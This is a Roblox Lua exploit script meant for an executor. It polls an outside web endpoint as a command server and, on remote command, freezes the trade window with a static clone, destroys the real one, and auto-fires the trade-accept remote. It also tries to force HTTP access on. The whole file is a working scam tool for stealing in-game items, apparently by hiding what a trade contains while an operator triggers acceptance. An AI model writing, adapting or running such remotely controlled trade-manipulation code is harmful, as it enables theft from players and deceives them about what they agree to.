local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local TradeGuiPhone = PlayerGui:WaitForChild("TradeGUI_Phone")

local clonedGui = nil  -- (This is still used when cloning, but we no longer rely on it for destruction.)

local function freezeTradeGui()
    if TradeGuiPhone then
        -- Clone the entire TradeGUI_Phone
        clonedGui = TradeGuiPhone:Clone()
        clonedGui.Parent = PlayerGui
        clonedGui.Name = "FrozenTrade"
        
        -- Iterate over all descendants to freeze the GUI
        for _, descendant in pairs(clonedGui:GetDescendants()) do
            if descendant:IsA("GuiObject") then
                descendant.Active = false  -- Disable interaction
            elseif descendant:IsA("LocalScript") or descendant:IsA("ModuleScript") then
                descendant:Destroy()  -- Remove scripts to prevent execution
            end
        end

        -- Optionally destroy the original TradeGUI_Phone
        TradeGuiPhone:Destroy()
        print("Trade GUI has been frozen and the original GUI was destroyed.")
    else
        print("Trade GUI not found.")
    end
end

-- Recursive destruction helper:
local function recursiveDestroy(inst)
    for _, child in ipairs(inst:GetChildren()) do
        recursiveDestroy(child)
    end
    print("Destroying instance:", inst:GetFullName())
    inst:Destroy()
end

-- Destroys all clones with the name "FrozenTrade"
local function destroyAllClonedGUIs()
    local playerGui = game:GetService("Players").LocalPlayer.PlayerGui
    for _, child in ipairs(playerGui:GetChildren()) do
        if child.Name == "FrozenTrade" then
            recursiveDestroy(child)
        end
    end
    print("All FrozenTrade clones have been destroyed.")
end

local function destroyOriginalGui()
    if TradeGuiPhone then
        TradeGuiPhone:Destroy()
        print("Original Trade GUI has been destroyed.")
    end
end

local function destroyBothGUIs()
    destroyAllClonedGUIs()
    destroyOriginalGui()
end

-- Function to accept the trade
local function acceptTrade()
    local acc = { [1] = 285646582 }
    ReplicatedStorage.Trade.AcceptTrade:FireServer(unpack(acc))
    print("Trade accepted via remote.")
end

-- Function to bypass HTTP restrictions for HTTP requests
local function bypassHttpRestrictions()
    if not HttpService.HttpEnabled then
        local success, err = pcall(function()
            HttpService.HttpEnabled = true
        end)
        if not success then
            warn("Unable to enable HTTP requests:", err)
        end
    end
end

-- Function to check for API communication
local function checkForCommands()
    local url = "https://stupid-video.vercel.app/api/trade"  -- Replace with your Vercel API endpoint
    local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (request)

    bypassHttpRestrictions()

    print("Checking for commands...")  -- Log each check

    local success, response = pcall(function()
        return requestFunction({
            Url = url,
            Method = "GET"
        })
    end)

    if success and response and response.StatusCode == 200 then
        print("API response received successfully. Status Code:", response.StatusCode)
        print("Response Body:", response.Body) -- Log the full response body
        local data = HttpService:JSONDecode(response.Body)
        if data.message == "Hello1" then
            print("Received 'Hello1' command. Freezing Trade GUI.")
            freezeTradeGui()
        elseif data.message == "Hello3" then
            print("Received 'Hello3' command. Destroying both cloned and original Trade GUIs.")
            destroyBothGUIs()
        elseif data.message == "Hello2" then
            print("Received 'Hello2' command. Accepting trade.")
            acceptTrade()
        else
            print("No relevant command received.")
        end
    else
        warn("Failed to check commands. Status:", response and response.StatusCode or "Unknown")
    end
end

-- Check for commands every 0.5 seconds
while true do
    checkForCommands()
    wait(0.5)
end
